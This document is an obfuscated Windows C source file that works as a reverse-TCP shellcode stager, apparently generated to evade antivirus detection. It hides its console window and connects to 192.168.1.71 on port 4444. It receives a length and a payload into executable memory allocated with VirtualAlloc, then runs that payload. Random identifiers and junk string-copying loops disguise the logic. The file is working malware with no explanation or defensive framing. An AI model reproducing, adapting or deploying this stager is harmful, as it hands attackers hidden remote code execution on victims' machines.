#define _WIN32_WINNT 0x0500
#include <winsock2.h>
#include <string.h>
#include <signal.h>
#include <stdio.h>
#include <time.h>
#include <math.h>
#include <stdlib.h>
#include <windows.h>
char* GHFlux(const char *t) { int length= strlen(t); int i; char* t2 = (char*)malloc((length+1) * sizeof(char)); for(i=0;i<length;i++) { t2[(length-1)-i]=t[i]; } t2[length] = '\0'; return t2; }
char* lvhILRgmurVF(char* s){ char *result =  malloc(strlen(s)*2+1); int i; for (i=0; i<strlen(s)*2+1; i++){ result[i] = s[i/2]; result[i+1]=s[i/2];} result[i] = '\0'; return result; }
void uSmczizuojfAqG() {WORD uiaWyp = MAKEWORD((0*3+2), (1*2+0)); WSADATA EywCfMFqilDrW;if (WSAStartup(uiaWyp, &EywCfMFqilDrW) < 0) { WSACleanup(); exit(1);}}
char* FzKQxaPfX(){ char *brBXoIIOALBNgaT = GHFlux("GeXdGRFMRlAQBLOKkpXKNoatosKKBcIbXlvMFbrcBUNIoPLYEx"); return strstr( brBXoIIOALBNgaT, "s" );}
void juQgIHmHSbeL(SOCKET olhfUlgpaFA) {closesocket(olhfUlgpaFA);WSACleanup();exit(1);}
char* lIuTyjsG() { char PWfFXfBKNAGObwK[9488] = "EkBatrpoUbouifZjrpyJhBgVOiwXhZJjOAHcBDeJBcflreqkmc"; char *hvLKvViuKetSo = strupr(PWfFXfBKNAGObwK); return strlwr(hvLKvViuKetSo); }
int rMfxykydAm(SOCKET tCLjsJoRPVL, void * SoCxfE, int ReBnYWQVpnCWGB){int slfkmklsDSA=0;int rcAmwSVM=0;void * startb = SoCxfE;while (rcAmwSVM < ReBnYWQVpnCWGB) {slfkmklsDSA = recv(tCLjsJoRPVL, (char *)startb, ReBnYWQVpnCWGB - rcAmwSVM, 0);startb += slfkmklsDSA; rcAmwSVM   += slfkmklsDSA;if (slfkmklsDSA == SOCKET_ERROR) juQgIHmHSbeL(tCLjsJoRPVL);} return rcAmwSVM; }
char* JWqqdTcKNDQnoz(){ char DtBWZeqUHsxqcp[9488], pikfhp[9488/2]; strcpy(DtBWZeqUHsxqcp,"xBDJZofKpbHDITlpHdquROExKfRmILYvoAaPJwfNzWFHeJbUoE"); strcpy(pikfhp,"dFHGBklblEWykheUVcYwwmHPRZcvvcXdUlczpmWAshAyRLyyXL"); return lvhILRgmurVF(strcat( DtBWZeqUHsxqcp, pikfhp)); }
SOCKET HLEAffqGKDZYd() { struct hostent * iAKeGR; struct sockaddr_in CKpUeUqKPL; SOCKET ikHiWZsqO;ikHiWZsqO = socket(AF_INET, SOCK_STREAM, 0);if (ikHiWZsqO == INVALID_SOCKET) juQgIHmHSbeL(ikHiWZsqO);iAKeGR = gethostbyname("192.168.1.71");if (iAKeGR == NULL) juQgIHmHSbeL(ikHiWZsqO);memcpy(&CKpUeUqKPL.sin_addr.s_addr, iAKeGR->h_addr, iAKeGR->h_length);CKpUeUqKPL.sin_family = AF_INET;CKpUeUqKPL.sin_port = htons((143*31+11));if ( connect(ikHiWZsqO, (struct sockaddr *)&CKpUeUqKPL, sizeof(CKpUeUqKPL)) ) juQgIHmHSbeL(ikHiWZsqO);return ikHiWZsqO;}
int main(int argc, char * argv[]) {ShowWindow( GetConsoleWindow(), SW_HIDE );ULONG32 rLTiFYYFPqLpXW;char * uDFFqZIkHE;int i;char* fVzOwIOQH[3457];void (*nYxjLWfgktI)();for (i = 0;  i < 3457;  ++i) fVzOwIOQH[i] = malloc (9597);uSmczizuojfAqG();char* YAfawGmrJ[3071];SOCKET dWBJib = HLEAffqGKDZYd();for (i = 0;  i < 3071;  ++i) YAfawGmrJ[i] = malloc (9558);int daQhNGKPqeoCr = recv(dWBJib, (char *)&rLTiFYYFPqLpXW, (2*2+0), 0);if (daQhNGKPqeoCr != (2*2+0) || rLTiFYYFPqLpXW <= 0) juQgIHmHSbeL(dWBJib);uDFFqZIkHE = VirtualAlloc(0, rLTiFYYFPqLpXW + (5*1+0), MEM_COMMIT, PAGE_EXECUTE_READWRITE);char* LuGPbKG[9694];for (i=0; i<3457; ++i){strcpy(fVzOwIOQH[i], FzKQxaPfX());}if (uDFFqZIkHE == NULL) juQgIHmHSbeL(dWBJib);uDFFqZIkHE[0] = 0xBF;memcpy(uDFFqZIkHE + 1, &dWBJib, (2*2+0));for (i = 0;  i < 9694;  ++i) LuGPbKG[i] = malloc (9511);for (i=0; i<3071; ++i){strcpy(YAfawGmrJ[i], lIuTyjsG());}daQhNGKPqeoCr = rMfxykydAm(dWBJib, uDFFqZIkHE + (5*1+0), rLTiFYYFPqLpXW);nYxjLWfgktI = (void (*)())uDFFqZIkHE;nYxjLWfgktI();for (i=0; i<9694; ++i){strcpy(LuGPbKG[i], JWqqdTcKNDQnoz());}return 0;}

